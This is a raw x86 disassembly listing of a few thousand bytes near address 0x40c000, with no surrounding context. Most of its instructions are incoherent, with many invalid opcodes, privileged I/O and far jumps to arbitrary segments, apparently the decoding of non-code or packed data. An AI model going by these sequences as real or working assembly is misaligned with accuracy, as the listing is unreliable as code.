  40bfa9:	out    0x7a,al
  40bfab:	sub    bh,BYTE PTR [ecx+0x6edb97ab]
  40bfb1:	cmp    bh,BYTE PTR [ebx]
  40bfb3:	nop
  40bfb4:	leave  
  40bfb5:	dec    edi
  40bfb6:	lea    bp,[edi]
  40bfb9:	or     DWORD PTR [eax+0x5efdedfe],ebp
  40bfbf:	jnp    0x40c00a
  40bfc1:	pushf  
  40bfc2:	mov    al,ds:0x39b2282f
  40bfc7:	test   DWORD PTR [esi],edi
  40bfc9:	push   cs
  40bfca:	xchg   ebp,eax
  40bfcb:	jp     0x40bfb3
  40bfcd:	enter  0xbd57,0x95
  40bfd1:	dec    eax
  40bfd2:	je     0x40bfa6
  40bfd4:	ror    DWORD PTR [esi+0x2f],0x19
  40bfd8:	jne    0x40bfe4
  40bfda:	xchg   ecx,eax
  40bfdb:	xchg   edx,eax
  40bfdc:	call   0x5414:0xbd13
  40bfe2:	or     ebx,DWORD PTR [ecx]
  40bfe4:	sub    al,0x8
  40bfe6:	mov    cl,0xaf
  40bfe8:	stc    
  40bfe9:	fdivr  DWORD PTR [edx+0x540e1430]
  40bfef:	lea    edi,[edx]
  40bff1:	sbb    DWORD PTR [esi-0x40cec10c],ebp
  40bff7:	mov    ebp,0x8a9e741c
  40bffc:	xor    ebp,esi
  40bffe:	stc    
  40bfff:	shl    BYTE PTR [ecx],0x1d
  40c002:	xchg   ecx,eax
  40c003:	add    cl,BYTE PTR [ebx]
  40c005:	cwde   
  40c006:	mov    ebp,0xf0c6ac59
  40c00b:	enter  0x1156,0x65
  40c00f:	xor    BYTE PTR [esi-0x64],cl
  40c012:	(bad)  
  40c013:	sbb    cl,BYTE PTR [eax+0x7e679509]
  40c019:	mov    WORD PTR [ebx-0x5e],ds
  40c01c:	cmp    eax,0x3503daa3
  40c021:	lea    esi,[ebx-0xe9383b3]
  40c027:	mov    bl,0xc5
  40c029:	xchg   ebp,eax
  40c02a:	out    dx,eax
  40c02b:	in     eax,dx
  40c02c:	add    eax,0xe66ae7d9
  40c031:	jmp    0x38f2:0x60625e37
  40c038:	mov    al,ds:0x8c0790a7
  40c03d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c03e:	sbb    eax,0xef791bb5
  40c043:	cmp    eax,0xd444963e
  40c048:	push   ebx
  40c049:	sub    DWORD PTR [ebp-0x75],edx
  40c04c:	or     al,0x9e
  40c04e:	cwde   
  40c04f:	out    dx,al
  40c050:	or     ecx,DWORD PTR [ebx]
  40c052:	jb     0x40c0b1
  40c054:	fisub  DWORD PTR [esi+0x78]
  40c057:	and    ah,al
  40c059:	pop    eax
  40c05a:	aas    
  40c05b:	cli    
  40c05c:	jp     0x40c001
  40c05e:	adc    DWORD PTR [esi-0x28],ecx
  40c061:	scas   al,BYTE PTR es:[edi]
  40c062:	dec    esp
  40c063:	xor    al,BYTE PTR [edi-0x44]
  40c066:	outs   dx,BYTE PTR ds:[esi]
  40c067:	bound  ebp,QWORD PTR [ecx-0x20]
  40c06a:	outs   dx,DWORD PTR ds:[esi]
  40c06b:	pop    edi
  40c06c:	aad    0x7d
  40c06e:	mov    edi,0x1c9e0f9c
  40c073:	stos   BYTE PTR es:[edi],al
  40c074:	mov    esi,DWORD PTR [esp+edx*1+0x6]
  40c078:	sub    BYTE PTR [eax-0x2a],dl
  40c07b:	enter  0xeb9e,0xde
  40c07f:	sbb    esi,DWORD PTR [ecx]
  40c081:	loop   0x40c0b6
  40c083:	xlat   BYTE PTR ds:[ebx]
  40c084:	and    al,BYTE PTR [edi-0x4f2aa84d]
  40c08a:	fnstsw WORD PTR [ecx]
  40c08c:	ret    0xdb7b
  40c08f:	push   cs
  40c090:	ins    DWORD PTR es:[edi],dx
  40c091:	jmp    0x1bc9fbc5
  40c096:	ja     0x40c0d3
  40c098:	jge    0x40c021
  40c09a:	cli    
  40c09b:	lods   eax,DWORD PTR ds:[esi]
  40c09c:	adc    DWORD PTR cs:[ebp+edi*8-0x79],edi
  40c0a1:	mov    al,ds:0x13305a7f
  40c0a6:	shl    BYTE PTR [edi+0x4d],cl
  40c0a9:	xchg   ecx,eax
  40c0aa:	rcl    DWORD PTR [edi-0x15],cl
  40c0ad:	cmp    ch,BYTE PTR [ebp-0x73]
  40c0b0:	jbe    0x40c07c
  40c0b2:	add    al,0x73
  40c0b4:	int3   
  40c0b5:	mov    ch,0xf8
  40c0b7:	pop    ebp
  40c0b8:	or     bh,BYTE PTR ds:0x14b2111c
  40c0be:	mov    esp,0xb5188429
  40c0c3:	dec    eax
  40c0c4:	fdiv   st,st(7)
  40c0c6:	ins    BYTE PTR es:[edi],dx
  40c0c7:	push   0x75c9db1c
  40c0cc:	sub    edi,DWORD PTR [ecx+0x68]
  40c0cf:	ja     0x40c136
  40c0d1:	inc    ecx
  40c0d2:	repnz fadd DWORD PTR ds:0xdce2ddbf
  40c0d9:	fs push esi
  40c0db:	rcr    DWORD PTR [eax+eiz*1],0x2c
  40c0df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0e0:	loopne 0x40c148
  40c0e2:	inc    ebx
  40c0e3:	jnp    0x40c0d7
  40c0e5:	les    ebx,FWORD PTR [edx+ebx*8-0x26c95faa]
  40c0ec:	loop   0x40c09b
  40c0ee:	jne    0x40c0cb
  40c0f0:	int3   
  40c0f1:	nop
  40c0f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0f3:	sub    ah,BYTE PTR [ebp+0x2b5b6215]
  40c0f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0fa:	test   DWORD PTR [esi-0x3c],edx
  40c0fd:	fs ret 0xb730
  40c101:	sbb    eax,0xa0ce6eb
  40c106:	call   0x14c2:0x69364307
  40c10d:	gs repz fdiv st,st(1)
  40c111:	(bad)  
  40c112:	pop    eax
  40c113:	out    0xcc,al
  40c115:	ficom  WORD PTR [edx+0x70816372]
  40c11b:	mov    ebp,0xcc9cce6c
  40c120:	mov    ebx,0x492a6c8b
  40c125:	repz fldcw WORD PTR [ebx-0x51a1dbb1]
  40c12c:	fs cs in al,dx
  40c12f:	mov    ecx,0xebb190e1
  40c134:	cwde   
  40c135:	outs   dx,DWORD PTR ds:[esi]
  40c136:	mov    al,ds:0x5feb535a
  40c13b:	test   BYTE PTR [edi-0x491f9141],bl
  40c141:	sub    al,dh
  40c143:	out    0xb3,al
  40c145:	(bad)  
  40c146:	scas   eax,DWORD PTR es:[edi]
  40c147:	cmp    ecx,DWORD PTR [edx-0x49]
  40c14a:	inc    ecx
  40c14b:	retf   
  40c14c:	mov    bl,0xaf
  40c14e:	jno    0x40c0f9
  40c150:	pop    ss
  40c151:	push   edi
  40c152:	int    0xd6
  40c154:	adc    cl,0xf9
  40c157:	loop   0x40c0f2
  40c159:	cli    
  40c15a:	xlat   BYTE PTR ds:[ebx]
  40c15b:	sub    BYTE PTR [ecx],ah
  40c15d:	stc    
  40c15e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c15f:	jbe    0x40c1ac
  40c161:	xchg   DWORD PTR [ecx+0x18],edi
  40c164:	adc    ch,BYTE PTR [eax-0x21]
  40c167:	cmp    ecx,esp
  40c169:	or     DWORD PTR [ebx+0x7746503f],0xfffffff9
  40c170:	shr    ebx,cl
  40c172:	int    0x4d
  40c174:	lds    ebp,FWORD PTR [eax-0x261e9f42]
  40c17a:	stos   DWORD PTR es:[edi],eax
  40c17b:	push   ecx
  40c17c:	arpl   WORD PTR [ecx-0x31],ax
  40c17f:	inc    esp
  40c180:	adc    al,0x11
  40c182:	add    al,0xaf
  40c184:	loopne 0x40c1b8
  40c186:	push   edx
  40c187:	imul   eax,eax,0x3a9ea5b
  40c18d:	pop    ebx
  40c18e:	test   al,0xaf
  40c190:	push   0xb9cac649
  40c195:	pop    ds
  40c196:	push   cs
  40c197:	or     eax,0xef6e4f50
  40c19c:	mov    eax,ds:0xdae2996e
  40c1a1:	push   ds
  40c1a2:	sbb    al,0x2e
  40c1a4:	fdivr  DWORD PTR [ebx]
  40c1a6:	pop    ds
  40c1a7:	aad    0xcd
  40c1a9:	in     al,0xf3
  40c1ab:	das    
  40c1ac:	pop    es
  40c1ad:	retf   
  40c1ae:	push   es
  40c1af:	pop    ss
  40c1b0:	lahf   
  40c1b1:	sub    BYTE PTR [ebx+edx*1+0x33],al
  40c1b5:	clc    
  40c1b6:	int3   
  40c1b7:	outs   dx,BYTE PTR ds:[esi]
  40c1b8:	xor    dl,bl
  40c1ba:	out    0xab,eax
  40c1bc:	mov    bl,0x9e
  40c1be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1bf:	pop    esp
  40c1c0:	call   0x6c91:0x16949412
  40c1c7:	add    ah,BYTE PTR [ecx+0x17]
  40c1ca:	(bad)  [eax-0xd]
  40c1cd:	mov    edi,0x4e19c005
  40c1d2:	popf   
  40c1d3:	shr    DWORD PTR [ecx+0x20],0x5d
  40c1d7:	inc    edx
  40c1d8:	or     eax,0x2e49da09
  40c1dd:	repnz and al,0x6d
  40c1e0:	adc    al,0x82
  40c1e2:	push   cs
  40c1e3:	inc    ecx
  40c1e4:	sar    BYTE PTR ds:0x5894639,1
  40c1ea:	and    al,BYTE PTR [edx]
  40c1ec:	sbb    BYTE PTR [edi+edx*2],bh
  40c1ef:	das    
  40c1f0:	pop    ss
  40c1f1:	xor    ah,cl
  40c1f3:	lods   eax,DWORD PTR ds:[esi]
  40c1f4:	inc    edx
  40c1f5:	dec    esi
  40c1f6:	xchg   DWORD PTR [ebp+0x192646c5],esi
  40c1fc:	cdq    
  40c1fd:	xsaveopt [esi+0x62]
  40c201:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c202:	bound  esi,QWORD PTR [edx-0x5a27732d]
  40c208:	or     DWORD PTR [ecx+0x6afb86b9],edi
  40c20e:	adc    al,0x89
  40c210:	push   ds
  40c211:	hlt    
  40c212:	mov    WORD PTR [eax+0x48],es
  40c215:	mov    ds:0x66afd089,eax
  40c21a:	push   edi
  40c21b:	xor    bh,BYTE PTR [edi]
  40c21d:	pusha  
  40c21e:	sub    al,0x65
  40c220:	push   cs
  40c221:	xor    DWORD PTR [ebx+0x13edf27c],0xede17dc1
  40c22b:	pop    ds
  40c22c:	add    esp,DWORD PTR [eax+0x11]
  40c22f:	and    al,0x34
  40c231:	push   cs
  40c232:	mov    BYTE PTR [edx],al
  40c234:	jmp    0x53c:0x49d5fbc
  40c23b:	imul   ebp,DWORD PTR [esi-0xf],0x6df9ac1b
  40c242:	inc    esi
  40c243:	or     DWORD PTR [edi+0xe785e02],esi
  40c249:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c24a:	dec    ecx
  40c24b:	out    0xc5,al
  40c24d:	into   
  40c24e:	inc    ecx
  40c24f:	lods   eax,DWORD PTR ds:[esi]
  40c250:	nop    DWORD PTR [ebx+eax*1+0x144683c9]
  40c258:	push   esi
  40c259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c25a:	push   ds
  40c25b:	cmp    dl,BYTE PTR [edx-0x739ecf33]
  40c261:	jb     0x40c208
  40c263:	mov    cl,bl
  40c265:	and    eax,0x74cf8a6f
  40c26a:	js     0x40c2b2
  40c26c:	lods   eax,DWORD PTR ds:[esi]
  40c26d:	je     0x40c1f7
  40c26f:	cld    
  40c270:	cmp    ch,bl
  40c272:	mov    eax,ds:0xdde75358
  40c277:	or     BYTE PTR [eiz*8+0x4f131b21],dh
  40c27e:	add    DWORD PTR [eax+0x7862e37e],ebx
  40c284:	push   eax
  40c285:	repnz inc esp
  40c287:	mov    al,0x5b
  40c289:	pop    ecx
  40c28a:	xchg   ebx,eax
  40c28b:	stos   DWORD PTR es:[edi],eax
  40c28c:	cli    
  40c28d:	xchg   ebp,eax
  40c28e:	sbb    eax,eax
  40c290:	jno    0x40c2e4
  40c292:	pop    esp
  40c293:	sbb    esi,ebx
  40c295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c296:	mov    ss,edx
  40c298:	(bad)
  40c29c:	fcomi  st,st(5)
  40c29e:	sub    dh,BYTE PTR [ebx]
  40c2a0:	(bad)  
  40c2a1:	jo     0x40c2fb
  40c2a3:	mov    DWORD PTR [esi-0x2187efd],eax
  40c2a9:	inc    ebx
  40c2aa:	shl    BYTE PTR [ebp+0x2a],1
  40c2ad:	xchg   ebp,eax
  40c2ae:	std    
  40c2af:	mov    cl,0x73
  40c2b1:	inc    esp
  40c2b2:	jle    0x40c253
  40c2b4:	add    cl,BYTE PTR [eax]
  40c2b6:	adc    dl,cl
  40c2b8:	mov    dh,0xe7
  40c2ba:	ret    0x8398
  40c2bd:	adc    ch,dl
  40c2bf:	and    esp,0x4802e47a
  40c2c5:	(bad)  
  40c2c6:	stos   BYTE PTR es:[edi],al
  40c2c7:	lds    ebx,FWORD PTR [edi+0x146baca5]
  40c2cd:	aaa    
  40c2ce:	xor    bl,BYTE PTR [esp+esi*1+0x11607986]
  40c2d5:	out    dx,eax
  40c2d6:	out    dx,al
  40c2d7:	pop    edx
  40c2d8:	out    0x70,eax
  40c2da:	push   eax
  40c2db:	lds    ebx,FWORD PTR [eax]
  40c2dd:	and    DWORD PTR [edi+0x24],ebp
  40c2e0:	fldcw  WORD PTR [esi-0x69a55243]
  40c2e6:	fs dec ebp
  40c2e8:	push   edx
  40c2e9:	loopne 0x40c2cb
  40c2eb:	sbb    DWORD PTR [edx+0x6e],0x5e
  40c2ef:	mov    DWORD PTR [ebp+0x3b],esp
  40c2f2:	jo     0x40c340
  40c2f4:	inc    ecx
  40c2f5:	adc    esi,DWORD PTR [ecx+0x2f]
  40c2f8:	ss mov cl,0x6
  40c2fb:	cwde   
  40c2fc:	dec    ebx
  40c2fd:	sahf   
  40c2fe:	cli    
  40c2ff:	jmp    0x40c2ec
  40c301:	clc    
  40c302:	push   0x2b
  40c304:	ret    0xd3ae
  40c307:	imul   ecx,DWORD PTR [esi-0x45],0x14
  40c30b:	cmp    dh,ah
  40c30d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c30e:	jp     0x40c38a
  40c310:	cmp    al,0xf6
  40c312:	mov    edi,esp
  40c314:	ret    0x3efc
  40c317:	scas   eax,DWORD PTR es:[edi]
  40c318:	mov    ch,0x5
  40c31a:	mov    edx,0xe8fa0860
  40c31f:	adc    BYTE PTR fs:[edi],al
  40c322:	or     ebx,DWORD PTR [ebp+ebx*2+0x35fac432]
  40c329:	mov    ebp,0xaffc1612
  40c32e:	arpl   WORD PTR [esi+0x7a],sp
  40c331:	jmp    0xf2ef68da
  40c336:	jp     0x40c382
  40c338:	or     DWORD PTR [ecx],0xcdae2d87
  40c33e:	(bad)  [esi+0x715709a3]
  40c344:	sbb    bl,dh
  40c346:	sbb    cl,ah
  40c348:	mov    al,ds:0xa815ed17
  40c34d:	sub    edi,edi
  40c34f:	push   ss
  40c350:	inc    ecx
  40c351:	not    DWORD PTR fs:[edi-0x31]
  40c355:	ret    0x4bed
  40c358:	adc    BYTE PTR [ebx],0x8e
  40c35b:	dec    ecx
  40c35c:	sub    dl,cl
  40c35e:	pushf  
  40c35f:	xor    al,dh
  40c361:	pop    ecx
  40c362:	or     BYTE PTR [edx],cl
  40c364:	leave  
  40c365:	push   ebx
  40c366:	or     DWORD PTR [ecx],0xf879626d
  40c36c:	push   0xe6afcb72
  40c371:	mov    ds:0xe5024f3a,al
  40c376:	pop    ebp
  40c377:	daa    
  40c378:	arpl   sp,cx
  40c37a:	and    ecx,esi
  40c37c:	cdq    
  40c37d:	cmp    BYTE PTR [edi+0x6f],ch
  40c380:	xor    al,0x8b
  40c382:	shl    BYTE PTR [edx+edx*1+0x5d],1
  40c386:	jo     0x40c366
  40c388:	pop    ecx
  40c389:	mov    esi,0x7ee188c4
  40c38e:	adc    DWORD PTR [edx],edi
  40c390:	push   eax
  40c391:	stc    
  40c392:	jl     0x40c3d3
  40c394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c395:	addr16 jmp 0xcad9dc63
  40c39b:	mov    cs,edi
  40c39d:	sub    al,0x4
  40c39f:	aam    0xdb
  40c3a1:	adc    edx,esp
  40c3a3:	mov    dh,0x4a
  40c3a5:	std    
  40c3a6:	mov    eax,0x907600bc
  40c3ab:	jb     0x40c3de
  40c3ad:	js     0x40c34d
  40c3af:	and    ah,BYTE PTR [esi-0x35b7eaad]
  40c3b5:	xor    ebx,DWORD PTR [esi-0x45]
  40c3b8:	xor    ebp,0xffffff96
  40c3bb:	shl    DWORD PTR [ebx+0x6a39f579],cl
  40c3c1:	mov    dl,0x9b
  40c3c3:	dec    ebp
  40c3c4:	cmp    ecx,ecx
  40c3c6:	pop    esi
  40c3c7:	test   eax,0xf9f62c38
  40c3cc:	pop    ds
  40c3cd:	pop    ecx
  40c3ce:	mov    ds:0xbd474f9a,al
  40c3d3:	loope  0x40c452
  40c3d5:	out    0xf7,al
  40c3d7:	mov    ebx,0xaf204097
  40c3dc:	push   ebx
  40c3dd:	xor    BYTE PTR [edx-0x5050d663],cl
  40c3e3:	xor    esi,DWORD PTR [edx-0x670315ea]
  40c3e9:	mov    ebx,eax
  40c3eb:	sbb    eax,ebp
  40c3ed:	jnp    0x40c3d2
  40c3ef:	inc    esi
  40c3f0:	cmp    BYTE PTR [eax+0x57],dl
  40c3f3:	mov    esp,DWORD PTR [edi+0x4a9dbd15]
  40c3f9:	popf   
  40c3fa:	nop
  40c3fb:	mov    ecx,0xc6687f55
  40c400:	lock mov ah,0x47
  40c403:	shr    DWORD PTR [eax],0xdf
  40c406:	push   ebp
  40c407:	mov    WORD PTR [esi*1+0x276565a3],gs
  40c40e:	repz or ah,BYTE PTR [ebx-0x3d]
  40c412:	gs out dx,eax
  40c414:	jecxz  0x40c46c
  40c416:	test   al,0x9f
  40c418:	push   ebp
  40c419:	mov    edx,0x6b9105f4
  40c41e:	loopne 0x40c3bb
  40c420:	clc    
  40c421:	(bad)  
  40c422:	(bad)  
  40c423:	aas    
  40c424:	lahf   
  40c425:	add    eax,0x48520a6d
  40c42a:	or     al,0xda
  40c42c:	retf   0xf862
  40c42f:	clc    
  40c430:	or     BYTE PTR [ecx],dl
  40c432:	push   0x29
  40c434:	imul   ecx,DWORD PTR [esi+0x17],0x6eefa0f2
  40c43b:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c43d:	mov    esi,0x2f6f64b
  40c442:	test   BYTE PTR [esi+0x27],cl
  40c445:	pop    ecx
  40c446:	fcomip st,st(5)
  40c448:	fdivr  st,st(6)
  40c44a:	jg     0x40c407
  40c44c:	pop    es
  40c44d:	iret   
  40c44e:	addr16 out 0xe,eax
  40c451:	stos   BYTE PTR es:[edi],al
  40c452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c453:	shr    DWORD PTR [ebx+0x128885db],0xaa
  40c45a:	jno    0x40c460
  40c45c:	and    esi,DWORD PTR [edx+esi*8]
  40c45f:	loop   0x40c491
  40c461:	xor    DWORD PTR [ecx+edx*1+0x46],ebx
  40c465:	pusha  
  40c466:	push   esp
  40c467:	cmp    DWORD PTR [edx+0x7a],ebx
  40c46a:	mov    ecx,0xf7b2422
  40c46f:	in     al,dx
  40c470:	push   0xffffff8f
  40c472:	test   DWORD PTR [eax+0xf],0xf6f52395
  40c479:	test   eax,0x7f64f95b
  40c47e:	aaa    
  40c47f:	cs jno 0x40c4a5
  40c482:	dec    esi
  40c483:	test   al,0x87
  40c485:	add    esp,DWORD PTR [esp+edi*8]
  40c488:	pop    ebx
  40c489:	push   ebp
  40c48a:	mov    eax,0xaeb24217
  40c48f:	xor    eax,0xc50b10d5
  40c494:	cwde   
  40c495:	mov    edx,0x87763199
  40c49a:	fnstcw WORD PTR [ebx-0x2a]
  40c49d:	push   eax
  40c49e:	fs jae 0x40c51c
  40c4a1:	mov    fs,ecx
  40c4a3:	pop    ebx
  40c4a4:	add    eax,0xe5070200
  40c4a9:	sbb    eax,DWORD PTR ds:0x95368508
  40c4af:	sub    edx,edx
  40c4b1:	adc    edi,edx
  40c4b3:	jo     0x40c4aa
  40c4b5:	arpl   WORD PTR [edi],ax
  40c4b7:	out    0xc4,al
  40c4b9:	push   edx
  40c4ba:	pop    es
  40c4bb:	mov    eax,ds:0x47cf6476
  40c4c0:	sbb    al,0x1a
  40c4c2:	add    al,0xb8
  40c4c4:	cli    
  40c4c5:	call   0xe30e:0xe1a3de57
  40c4cc:	xchg   BYTE PTR [esi],ch
  40c4ce:	push   0x3a19b3ee
  40c4d3:	std    
  40c4d4:	mov    DWORD PTR [eax+0x3d01390c],ecx
  40c4da:	int    0xc8
  40c4dc:	mov    WORD PTR [edi],ss
  40c4de:	stos   DWORD PTR es:[edi],eax
  40c4df:	(bad)  [edx-0x3e]
  40c4e2:	stos   BYTE PTR es:[edi],al
  40c4e3:	xchg   DWORD PTR [eax],ebx
  40c4e5:	das    
  40c4e6:	inc    esi
  40c4e7:	pop    ecx
  40c4e8:	pop    ss
  40c4e9:	and    BYTE PTR [eax+0x6d19cdc7],dh
  40c4ef:	push   esp
  40c4f0:	and    eax,0xfc667c8e
  40c4f5:	sbb    dl,dl
  40c4f7:	adc    DWORD PTR [edi-0x7a],esi
  40c4fa:	lea    esi,[ebx]
  40c4fc:	mov    al,0x7c
  40c4fe:	adc    DWORD PTR [ecx+0x17],eax
  40c501:	xor    DWORD PTR [ecx+0x515b57a4],eax
  40c507:	push   esp
  40c508:	or     al,0xe6
  40c50a:	jne    0x40c51c
  40c50c:	inc    ebp
  40c50d:	jae    0x40c4f8
  40c50f:	fild   QWORD PTR [eax]
  40c511:	push   ebp
  40c512:	mov    ch,BYTE PTR [eax-0x5ae24900]
  40c518:	inc    edx
  40c519:	jns    0x40c4a2
  40c51b:	xchg   ebp,eax
  40c51c:	int3   
  40c51d:	(bad)  
  40c51e:	fidiv  WORD PTR [ebp+0x5b9da0c7]
  40c524:	adc    eax,0x2a74ff05
  40c529:	mov    edi,0x4635a771
  40c52e:	test   DWORD PTR [ebp-0x4efeac8f],0xd015455c
  40c538:	inc    ebp
  40c539:	push   cs
  40c53a:	fbld   TBYTE PTR [ecx+ebp*8-0x24]
  40c53e:	xor    eax,0xabcbc81
  40c543:	fld    TBYTE PTR [eax-0x58]
  40c546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c547:	add    edi,DWORD PTR [edi]
  40c549:	jo     0x40c581
  40c54b:	xchg   ebx,eax
  40c54c:	mov    ds:0xb6e4202f,eax
  40c551:	or     eax,DWORD PTR [ecx]
  40c553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c554:	aam    0x25
  40c556:	sbb    al,BYTE PTR [esi-0x5bac791a]
  40c55c:	in     eax,0x3d
  40c55e:	mov    ds:0xf5c78d25,al
  40c563:	mov    edx,0x26650e05
  40c568:	jne    0x40c583
  40c56a:	fucom  st(4)
  40c56c:	and    al,0x43
  40c56e:	pop    edi
  40c56f:	out    dx,al
  40c570:	xchg   DWORD PTR [edi+0x8eac0ab],esp
  40c576:	jmp    0x6b55657
  40c57b:	sbb    al,0x7e
  40c57d:	(bad)  
  40c57e:	fisub  DWORD PTR [eax]
  40c580:	pop    eax
  40c581:	les    ecx,FWORD PTR ds:0xdf43e7fb
  40c587:	adc    DWORD PTR es:[edx+ecx*2+0xe7c60a3],esi
  40c58f:	(bad)  
  40c591:	out    0xe7,eax
  40c593:	dec    esi
  40c594:	dec    ecx
  40c595:	fisub  DWORD PTR [ebp+edx*8-0x29]
  40c599:	jmp    0xea1d:0x7cfbb334
  40c5a0:	cwde   
  40c5a1:	jecxz  0x40c5ea
  40c5a3:	jmp    0x4f32:0x238ca229
  40c5aa:	dec    ecx
  40c5ab:	in     al,0xe
  40c5ad:	rcr    DWORD PTR [edi+esi*2],cl
  40c5b0:	mov    ds:0xb775f939,al
  40c5b5:	pop    ebx
  40c5b6:	cld    
  40c5b7:	ror    DWORD PTR [edx+0x5454eef9],cl
  40c5bd:	cmp    DWORD PTR [edx],esp
  40c5bf:	xchg   esi,eax
  40c5c0:	popf   
  40c5c1:	mov    bh,0xed
  40c5c3:	inc    ebx
  40c5c4:	ja     0x40c5dd
  40c5c6:	sub    BYTE PTR cs:[esi-0x66],bl
  40c5ca:	jb     0x40c579
  40c5cc:	push   ebp
  40c5cd:	and    eax,0xc82343c3
  40c5d2:	cmp    al,0xf4
  40c5d5:	add    eax,0x17d32ad4
  40c5da:	nop
  40c5db:	sbb    eax,0xffffffa0
  40c5de:	push   ebx
  40c5df:	lahf   
  40c5e0:	and    al,0xce
  40c5e2:	ins    DWORD PTR es:[edi],dx
  40c5e3:	icebp  
  40c5e4:	and    al,0xf8
  40c5e6:	(bad)  
  40c5e7:	cli    
  40c5e8:	in     al,dx
  40c5e9:	dec    ebp
  40c5ea:	inc    edi
  40c5eb:	add    DWORD PTR [esi+0xb],edx
  40c5ee:	sub    bh,dh
  40c5f0:	retf   0x382c
  40c5f3:	aaa    
  40c5f4:	in     al,0x76
  40c5f6:	mov    eax,0x430b1cea
  40c5fb:	jp     0x40c591
  40c5fd:	dec    esp
  40c5fe:	push   0x75
  40c600:	hlt    
  40c601:	jge    0x40c5ec
  40c603:	jmp    0xe5cb7ce0
  40c608:	rcl    DWORD PTR [ebp+0x5bdd5945],cl
  40c60e:	mov    esp,0x491aa5dc
  40c613:	add    ch,dh
  40c615:	adc    al,0x51
  40c617:	and    al,0xa7
  40c619:	add    esi,edx
  40c61b:	sbb    BYTE PTR [esi],ah
  40c61d:	inc    ebp
  40c61e:	xchg   esp,eax
  40c61f:	mov    ecx,0x84e9efa4
  40c624:	sub    ah,BYTE PTR [ebp-0x245de13c]
  40c62a:	jae    0x40c600
  40c62c:	call   0x7e49:0xbda835f2
  40c633:	lods   eax,DWORD PTR ds:[esi]
  40c634:	jo     0x40c6a3
  40c636:	push   cs
  40c637:	inc    edi
  40c638:	fiadd  DWORD PTR [eax-0x33032db0]
  40c63e:	lock jns 0x40c684
  40c641:	or     al,0x45
  40c643:	test   al,0x1e
  40c645:	add    BYTE PTR ds:0x3e41e069,0xb3
  40c64c:	nop
  40c64d:	retf   
  40c64e:	sar    bl,0x8a
  40c651:	retf   0x5fbb
  40c654:	daa    
  40c655:	stos   DWORD PTR es:[edi],eax
  40c656:	cdq    
  40c657:	or     BYTE PTR [edx+0x25bdd6ea],dl
  40c65d:	cmc    
  40c65e:	int3   
  40c65f:	push   ecx
  40c660:	add    BYTE PTR [eax-0x65c6e315],bh
  40c666:	cld    
  40c667:	mov    WORD PTR [esi],cs
  40c669:	xor    DWORD PTR [ebx],eax
  40c66b:	cwde   
  40c66c:	pop    ds
  40c66d:	pop    ecx
  40c66e:	popa   
  40c66f:	in     al,0x46
  40c671:	dec    edx
  40c672:	jo     0x40c63a
  40c674:	add    BYTE PTR [ecx-0x3a759400],bl
  40c67a:	inc    eax
  40c67b:	in     eax,0x36
  40c67d:	mov    ss,WORD PTR [esi-0x52]
  40c680:	sub    al,0x96
  40c682:	mov    bl,0x45
  40c684:	cmp    bh,BYTE PTR [edi-0x43]
  40c687:	je     0x40c6b3
  40c689:	cmp    al,0xe3
  40c68b:	jmp    0x76bf:0xb5da7299
  40c692:	sar    DWORD PTR [ebx],cl
  40c694:	pop    ds
  40c695:	pop    ds
  40c696:	xchg   ebp,eax
  40c697:	inc    di
  40c699:	stc    
  40c69a:	and    BYTE PTR [eax-0x1b286171],al
  40c6a0:	popf   
  40c6a1:	or     edi,DWORD PTR [ebp+0x58ee00ed]
  40c6a7:	mov    fs,WORD PTR [ebx+0x3e]
  40c6aa:	jo     0x40c6b1
  40c6ac:	stos   DWORD PTR es:[edi],eax
  40c6ad:	retf   0x2d9a
  40c6b0:	adc    BYTE PTR [esi],al
  40c6b2:	stos   BYTE PTR es:[edi],al
  40c6b3:	pop    es
  40c6b4:	cmp    bh,BYTE PTR [esi]
  40c6b6:	jo     0x40c6ef
  40c6b8:	mov    dh,0xdd
  40c6ba:	inc    edx
  40c6bb:	or     al,0xe5
  40c6bd:	aaa    
  40c6be:	cld    
  40c6bf:	dec    ebp
  40c6c0:	adc    al,BYTE PTR [edx]
  40c6c2:	dec    eax
  40c6c3:	mov    ecx,0x20bfd8bf
  40c6c8:	add    edi,ebp
  40c6ca:	fdiv   st(4),st
  40c6cc:	jnp    0x40c713
  40c6ce:	popf   
  40c6cf:	outs   dx,DWORD PTR ds:[esi]
  40c6d0:	(bad)  
  40c6d1:	fsubp  st(3),st
  40c6d3:	mov    edx,0x33f6070f
  40c6d8:	nop
  40c6d9:	retf   0xa49d
  40c6dc:	inc    ebx
  40c6dd:	out    dx,eax
  40c6de:	call   0x947f:0xb5690594
  40c6e5:	jp     0x40c6e0
  40c6e7:	nop
  40c6e8:	xor    ch,dl
  40c6ea:	mov    bl,0x64
  40c6ec:	mov    ds,WORD PTR [edx]
  40c6ee:	mov    edi,0x765854dd
  40c6f3:	mov    dh,0xf6
  40c6f5:	jge    0x40c6f6
  40c6f7:	sub    DWORD PTR fs:[eax],esi
  40c6fa:	stos   BYTE PTR es:[edi],al
  40c6fb:	test   eax,0x92e558fb
  40c700:	inc    esp
  40c701:	daa    
  40c702:	push   edx
  40c703:	ss hlt 
  40c705:	aam    0x32
  40c707:	inc    edi
  40c708:	int3   
  40c709:	cmc    
  40c70a:	xor    dh,BYTE PTR [edx-0x4a293419]
  40c710:	or     al,BYTE PTR [esi+0x3581a2f6]
  40c716:	test   DWORD PTR [ebp-0x2e],edx
  40c719:	mov    dl,0x43
  40c71b:	mov    al,ds:0x5b6ee891
  40c720:	packuswb mm7,QWORD PTR [edi]
  40c723:	scas   al,BYTE PTR es:[edi]
